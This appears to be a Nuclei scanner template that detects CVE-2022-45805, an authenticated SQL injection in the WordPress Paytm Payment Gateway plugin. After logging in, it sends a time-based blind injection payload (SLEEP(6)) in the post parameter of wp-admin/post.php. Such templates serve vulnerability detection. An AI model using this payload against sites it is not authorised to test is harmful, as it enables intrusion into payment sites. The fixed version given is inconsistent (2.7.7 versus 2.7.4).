id: CVE-2022-45805
info:
  name: WordPress Paytm Payment Gateway <=2.7.3 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Paytm Payment Gateway plugin version 2.7.3 and below
    is vulnerable to SQL injection, which may allow attackers to obtain sensitive
    information or perform unauthorized administrative actions on the affected website.
  remediation: Update to version 2.7.7 or a newer patched version.
  reference:
  - https://patchstack.com/database/vulnerability/paytm-payments/wordpress-paytm-payment-gateway-plugin-2-7-3-auth-sql-injection-sqli-vulnerability
  - https://wordpress.org/plugins/paytm-payments/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-45805
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    cve-id: CVE-2022-45805
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in the WordPress Paytm Payment Gateway
      plugin can have a significant impact, allowing attackers to access sensitive
      information, modify data, and execute unauthorized administrative operations
      on affected sites.
    recommendation: It is recommended that users of the WordPress Paytm Payment Gateway
      plugin upgrade to version 2.7.4 or later to address the SQL injection vulnerability
      and prevent potential unauthorized access to sensitive information.
  tags: cve,cve2022,sqli,wordpress,wp-plugin,wp,paytm-payments,authenticated
requests:
- raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - '@timeout: 15s

    GET /wp-admin/post.php?post=1+AND+(SELECT+6205+FROM+(SELECT(SLEEP(6)))RtRs)&action=edit
    HTTP/1.1

    Host: {{Hostname}}

    '
  cookie-reuse: true
  matchers:
  - type: dsl
    dsl:
    - duration_2>=6
    - status_code_2 == 200
    - contains(body_2, "toplevel_page_paytm")
    condition: and
